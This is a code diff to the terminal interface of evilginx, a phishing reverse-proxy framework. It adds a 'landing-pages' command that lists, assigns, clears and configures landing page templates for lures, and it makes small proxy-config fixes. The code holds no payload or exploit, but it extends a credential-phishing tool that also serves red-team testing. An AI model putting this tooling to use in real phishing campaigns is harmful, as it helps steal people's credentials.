@@ -1868,7 +1868,7 @@ func (t *Terminal) handleProxy(args []string) error {
 	case 1:
 		switch args[0] {
 		case "enable":
-			err := t.p.setProxy(true, t.p.cfg.proxyConfig.Type, t.p.cfg.proxyConfig.Address, t.p.cfg.proxyConfig.Port, t.p.cfg.proxyConfig.Username, t.p.cfg.proxyConfig.Password)
+			err := t.p.setProxy(true, t.cfg.proxyConfig.Type, t.cfg.proxyConfig.Address, t.cfg.proxyConfig.Port, t.cfg.proxyConfig.Username, t.cfg.proxyConfig.Password)
 			if err != nil {
 				return err
 			}
@@ -1876,7 +1876,7 @@ func (t *Terminal) handleProxy(args []string) error {
 			log.Important("you need to restart evilginx for the changes to take effect!")
 			return nil
 		case "disable":
-			err := t.p.setProxy(false, t.p.cfg.proxyConfig.Type, t.p.cfg.proxyConfig.Address, t.p.cfg.proxyConfig.Port, t.p.cfg.proxyConfig.Username, t.p.cfg.proxyConfig.Password)
+			err := t.p.setProxy(false, t.cfg.proxyConfig.Type, t.cfg.proxyConfig.Address, t.cfg.proxyConfig.Port, t.cfg.proxyConfig.Username, t.cfg.proxyConfig.Password)
 			if err != nil {
 				return err
 			}
@@ -2654,6 +2654,106 @@ func (t *Terminal) handleLures(args []string) error {
 				}
 			} else {
 				return fmt.Errorf("incorrect number of arguments")
+			}
+		case "landing-pages":
+			switch pn {
+			case 1:
+				// List all available landing page templates
+				templates, err := t.cfg.ListLandingPageTemplates()
+				if err != nil {
+					return fmt.Errorf("landing-pages: %v", err)
+				}
+				t.output("%s", t.sprintLandingPages(templates))
+				return nil
+			case 2:
+				if args[1] == "list" {
+					templates, err := t.cfg.ListLandingPageTemplates()
+					if err != nil {
+						return fmt.Errorf("landing-pages: %v", err)
+					}
+					t.output("%s", t.sprintLandingPages(templates))
+					return nil
+				}
+				return fmt.Errorf("landing-pages: unknown subcommand '%s'", args[1])
+			case 3:
+				if args[1] == "set" {
+					// Parse lure_id:template_id format
+					parts := strings.Split(args[2], ":")
+					if len(parts) != 2 {
+						return fmt.Errorf("landing-pages set: expected format 'lure_id:category/template'")
+					}
+					l_id, err := strconv.Atoi(strings.TrimSpace(parts[0]))
+					if err != nil {
+						return fmt.Errorf("landing-pages set: invalid lure_id: %v", err)
+					}
+					l, err := t.cfg.GetLure(l_id)
+					if err != nil {
+						return fmt.Errorf("landing-pages set: %v", err)
+					}
+					template_id := parts[1]
+					// Verify template exists
+					_, err = t.cfg.GetLandingPageTemplate(template_id)
+					if err != nil {
+						return fmt.Errorf("landing-pages set: %v", err)
+					}
+					l.LandingPage = template_id
+					err = t.cfg.SetLure(l_id, l)
+					if err != nil {
+						return fmt.Errorf("landing-pages set: %v", err)
+					}
+					log.Info("landing page '%s' assigned to lure %d", template_id, l_id)
+					return nil
+				} else if args[1] == "clear" {
+					l_id, err := strconv.Atoi(strings.TrimSpace(args[2]))
+					if err != nil {
+						return fmt.Errorf("landing-pages clear: invalid lure_id: %v", err)
+					}
+					l, err := t.cfg.GetLure(l_id)
+					if err != nil {
+						return fmt.Errorf("landing-pages clear: %v", err)
+					}
+					l.LandingPage = ""
+					l.LandingConfig = nil
+					err = t.cfg.SetLure(l_id, l)
+					if err != nil {
+						return fmt.Errorf("landing-pages clear: %v", err)
+					}
+					log.Info("landing page cleared for lure %d", l_id)
+					return nil
+				}
+				return fmt.Errorf("landing-pages: unknown subcommand '%s'", args[1])
+			case 4:
+				if args[1] == "config" {
+					l_id, err := strconv.Atoi(strings.TrimSpace(args[2]))
+					if err != nil {
+						return fmt.Errorf("landing-pages config: invalid lure_id: %v", err)
+					}
+					l, err := t.cfg.GetLure(l_id)
+					if err != nil {
+						return fmt.Errorf("landing-pages config: %v", err)
+					}
+					// Parse key=value
+					val := args[3]
+					sp := strings.Index(val, "=")
+					if sp == -1 {
+						return fmt.Errorf("landing-pages config: expected format 'key=value'")
+					}
+					k := val[:sp]
+					v := val[sp+1:]
+					if l.LandingConfig == nil {
+						l.LandingConfig = make(map[string]string)
+					}
+					l.LandingConfig[k] = v
+					err = t.cfg.SetLure(l_id, l)
+					if err != nil {
+						return fmt.Errorf("landing-pages config: %v", err)
+					}
+					log.Info("landing page config: %s = '%s' for lure %d", k, v, l_id)
+					return nil
+				}
+				return fmt.Errorf("landing-pages: unknown subcommand '%s'", args[1])
+			default:
+				return fmt.Errorf("landing-pages: too many arguments")
 			}
 		case "delete":
 			if pn == 2 {
@@ -3720,7 +3820,7 @@ func (t *Terminal) sprintLures() string {
 	hcyan := color.New(color.FgHiCyan)
 	white := color.New(color.FgHiWhite)
 	//n := 0
-	cols := []string{"id", "phishlet", "hostname", "path", "redirector", "post_redirector", "redirect_url", "paused", "og"}
+	cols := []string{"id", "phishlet", "hostname", "path", "redirector", "post_redirector", "redirect_url", "paused", "og", "landing_page"}
 	var rows [][]string
 	for n, l := range t.cfg.lures {
 		var og string
@@ -3747,8 +3847,39 @@ func (t *Terminal) sprintLures() string {
 
 		var s_paused string = higreen.Sprint(GetDurationString(time.Now(), time.Unix(l.PausedUntil, 0)))
 
-		rows = append(rows, []string{strconv.Itoa(n), hiblue.Sprint(l.Phishlet), cyan.Sprint(l.Hostname), hcyan.Sprint(l.Path), white.Sprint(l.Redirector), white.Sprint(l.PostRedirector), yellow.Sprint(l.RedirectUrl), s_paused, og})
+		landingPage := l.LandingPage
+		if landingPage == "" {
+			landingPage = "-"
+		}
+
+		rows = append(rows, []string{strconv.Itoa(n), hiblue.Sprint(l.Phishlet), cyan.Sprint(l.Hostname), hcyan.Sprint(l.Path), white.Sprint(l.Redirector), white.Sprint(l.PostRedirector), yellow.Sprint(l.RedirectUrl), s_paused, og, cyan.Sprint(landingPage)})
 	}
+	return AsTable(cols, rows)
+}
+
+func (t *Terminal) sprintLandingPages(templates []*LandingPageTemplate) string {
+	hiblue := color.New(color.FgHiBlue)
+	higreen := color.New(color.FgHiGreen)
+	yellow := color.New(color.FgYellow)
+	white := color.New(color.FgHiWhite)
+
+	cols := []string{"template_id", "category", "name", "description", "params"}
+	var rows [][]string
+
+	for _, template := range templates {
+		paramCount := len(template.Params)
+		paramsStr := white.Sprintf("%d params", paramCount)
+		if paramCount == 0 {
+			paramsStr = yellow.Sprint("none")
+		}
+		templateID := fmt.Sprintf("%s/%s", template.Category, template.ID)
+		rows = append(rows, []string{higreen.Sprint(templateID), yellow.Sprint(template.Category), hiblue.Sprint(template.Name), white.Sprint(template.Description), paramsStr})
+	}
+
+	if len(rows) == 0 {
+		return yellow.Sprint("No landing page templates found. Create templates in the landing_pages/ directory.")
+	}
+
 	return AsTable(cols, rows)
 }
 
